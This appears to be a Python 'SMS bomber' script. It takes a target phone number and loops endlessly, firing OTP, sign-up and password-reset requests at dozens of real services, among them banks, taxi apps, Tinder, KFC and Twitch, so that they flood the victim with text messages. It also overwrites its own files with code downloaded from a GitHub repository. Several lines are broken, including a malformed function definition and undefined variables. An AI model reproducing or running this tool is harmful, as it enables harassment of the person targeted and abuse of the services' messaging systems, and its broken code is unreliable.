import requests, random, datetime, sys, time, argparse, os
from colorama import init, Fore, Back, Style
from time import sleep
import urllib.request
init()

print(Fore.GREEN + Back.BLACK + Style.BRIGHT + '''
 ______   _______  _______  _______  _______  _______ 
(  __  \ (  ____ \(       )(  ___  )/ ___   )(  ___  )
| (  \  )| (    \/| () () || (   ) |\/   )  || (   ) |
| |   ) || (__    | || || || |   | |    /   )| (___) |
| |   | ||  __)   | |(_)| || |   | |   /   / |  ___  |
| |   ) || (      | |   | || |   | |  /   /  | (   ) |
| (__/  )| (____/\| )   ( || (___) | /   (_/\| )   ( |
(______/ (_______/|/     \|(_______)(_______/|/     \|                                              
''' + Style.RESET_ALL)


            
def shutdown(signal, frame):
    print ('\n\033[1;31mCtrl+C was pressed, shutting down!\033[0m')
    sys.exit()
    
def checkinternet():
    res = False
    try:
        requests.get('https://www.google.com', verify=True)
        res = False
    except Exception:
        res = True
    if res:
        print("\n\n\tIt seems That Your Internet Speed is Slow or You Are Using Proxies..")
        banner()
        exit()
def update():
    stuff_to_update = ['sms.py', '.version']
    for fl in stuff_to_update:
        dat = urllib.request.urlopen(
            "https://raw.githubusercontent.com/demoza/Reborn/master/" + fl).read()
        file = open(fl, 'wb')
        file.write(dat)
        file.close()
    print('\n\t\tUpdated Successfull !!!!')
    print('\tPlease Run The Script Again...')
    exit()

try:
    urllib.request.urlopen('https://www.google.com')
except Exception:
    print("You are not connected To Internet!!!")
    print("\tPlease Connect To Internet To Continue...\n")
    input('Exiting....\n Press Enter To Continue....')
    exit()
print('\tChecking For Updates...')
ver = urllib.request.urlopen(
    "https://raw.githubusercontent.com/demoza/Reborn/master/.version").read().decode('utf-8')
verl = ''
try:
    verl = open(".version", 'r').read()
except Exception:
    pass
if ver != verl:
    print('\t\tUpdate is Available....')
    print('\tStarting Update...')
    update()
print("Your Version is Up-To-Date")
try:
    noti = urllib.request.urlopen(
        "https://raw.githubusercontent.com/demoza/Reborn/master/.notify").read().decode('utf-8')
    noti = noti.upper().strip()
    if len(noti) > 10:
        print('\n\n\tNOTIFICATION: ' + noti + '\n\n')
except Exception:
    pass
    
    
    
_phone = input('Enter Target Number -->> ')
_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]






iteration = 2

def infinite(_phone max):
    global iteration
    while True:
        while os.path.exists('proc.xxx'):
            time.sleep(0.5)
        os.system('touch proc.xxx')
            continue
        os.system('rm proc.xxx >/dev/null 2>&1')
        iteration += 1
        time.sleep(float(dl))
        if (iteration > maxlim):
            exit()



while True:
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'
	try:
		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
		print('[+] Grab Requests Successful!')
	except:
		print('[-] Grab Requests Failed!')

	try:
		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
		print('[+] RuTaxi Requests Successful!')
	except:
		print('[-] RuTaxi Requests Failed!')

	try:
		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
		print('[+] BelkaCar Requests Successful!')
	except:
		print('[-] BelkaCar Requests Failed!')

	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
		print('[+] Tinder Requests Successful!')
	except:
		print('[-] Tinder Requests Failed!')

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
		print('[+] Karusel Requests Successful!')
	except:
		print('[-] Karusel Requests Failed!')

	try:
		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
		print('[+] Tinkoff Requests Successful!')
	except:
		print('[-] Tinkoff Requests Failed!')

	try:
		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
		print('[+] MTS Requests Successful!')
	except:
		print('[-] MTS Requests Failed!')

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print('[+] Youla Requests Successful!')
	except:
		print('[-] Youla Requests Failed!')

	try:
		requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
		print('[+] PizzaHut Requests Successful!')
	except:
		print('[-] PizzaHut Requests Failed!')

	try:
		requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
		print('[+] Rabota Requests Successful!')
	except:
		print('[-] Rabota Requests Failed!')

	try:
		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
		print('[+] Smsint Requests Successful!')
	except:
		print('[-] Smsint Requests Failed!')

	try:
		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
		print('[+] oyorooms Requests Successful!')
	except:
		print('[-] oyorooms Requests Failed!')

	try:
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
		print('[+] MVideo Requests Successful!')
	except:
		print('[-] MVideo Requests Failed!')

	try:
		requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
		print('[+] newnext Requests Successful!')
	except:
		print('[-] newnext Requests Failed!')

	try:
		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
		print('[+] Sunlight Requests Successful!')
	except:
		print('[-] Sunlight Requests Failed!')

	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
		print('[+] alpari Requests Successful!')
	except:
		print('[-] alpari Requests Failed!')

	try:
		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
		print('[+] Invitro Requests Successful!')
	except:
		print('[-] Invitro Requests Failed!')

	try:
		requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
		print('[+] Sberbank Requests Successful!')
	except:
		print('[-] Sberbank Requests Failed!')

	try:
		requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
		print('[+] Psbank Requests Successful!')
	except:
		print('[-] Psbank Requests Failed!')

	try:
		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
		print('[+] Beltelcom Requests Successful!')
	except:
		print('[-] Beltelcom Requests Failed!')

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
		print('[+] Karusel Requests Successful!')
	except:
		print('[-] Karusel Requests Failed!')

	try:
		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
		print('[+] KFC Requests Successful!')
	except:
		print('[-] KFC Requests Failed!')

	try:
		requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
		print('[+] carsmile Requests Successful!')
	except:
		print('[-] carsmile Requests Failed!')

	try:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
		print('[+] Citilink Requests Successful!')
	except:
		print('[-] Citilink Requests Failed!')

	try:
		requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
		print('[+] Delitime Requests Successful!')
	except:
		print('[-] Delitime Requests Failed!')

	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('[+] findclone Requests Successful!')
	except:
		print('[-] findclone Requests Failed!')

	try:
		requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
		print('[+] Guru Requests Successful!')
	except:
		print('[-] Guru Requests Failed!')

	try:
		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
		print('[+] ICQ Requests Successful!')
	except:
		print('[-] ICQ Requests Failed!')

	try:
		requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
		print('[+] InDriver Requests Successful!')
	except:
		print('[-] InDriver Requests Failed!')

	try:
		requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
		print('[+] Invitro Requests Successful!')
	except:
		print('[-] Invitro Requests Failed!')

	try:
		requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
		print('[+] Pmsm Requests Successful!')
	except:
		print('[-] Pmsm Requests Failed!')

	try:
		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
		print('[+] IVI Requests Successful!')
	except:
		print('[-] IVI Requests Failed!')

	try:
		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
		print('[+] Lenta Requests Successful!')
	except:
		print('[-] Lenta Requests Failed!')

	try:
		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
		print('[+] Mail.ru Requests Successful!')
	except:
		print('[-] Mail.ru Requests Failed!')

	try:
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
		print('[+] MVideo Requests Successful!')
	except:
		print('[-] MVideo Requests Failed!')

	try:
		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
		print('[+] OK Requests Successful!')
	except:
		print('[-] OK Requests Failed!')

	try:
		requests.post('https://plink.tech/register/',json={"phone": _phone})
		print('[+] Plink Requests Successful!')
	except:
		print('[-] Plink Requests Failed!')

	try:
		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
		print('[+] qlean Requests Successful!')
	except:
		print('[-] qlean Requests Failed!')

	try:
		requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
		print('[+] SMSgorod Requests Successful!')
	except:
		print('[-] SMSgorod Requests Failed!')

	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
		print('[+] Tinder Requests Successful!')
	except:
		print('[-] Tinder Requests Failed!')

	try:
		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
		print('[+] Twitch Requests Successful!')
	except:
		print('[-] Twitch Requests Failed!')

	try:
		requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
		print('[+] CabWiFi Requests Successful!')
	except:
		print('[-] CabWiFi Requests Failed!')

	try:
		requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
		print('[+] wowworks Requests Successful!')
	except:
		print('[-] wowworks Requests Failed!')

	try:
		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
		print('[+] Eda.Yandex Requests Successful!')
	except:
		print('[-] Eda.Yandex Requests Failed!')

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print('[+] Youla Requests Successful!')
	except:
		print('[-] Youla Requests Failed!')

	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
		print('[+] Alpari Requests Successful!')
	except:
		print('[-] Alpari Requests Failed!')

	try:
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
		print('[+] SMS Requests Successful!')
	except:
		print('[-] SMS Requests Failed!')

	try:
		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
		print('[+] Delivery Requests Successful!')
	except:
		print('[-] Delivery Requests Failed!')



	try:
		iteration += 1
		print(('{}completed tours = ').format(iteration))
	except:
		break
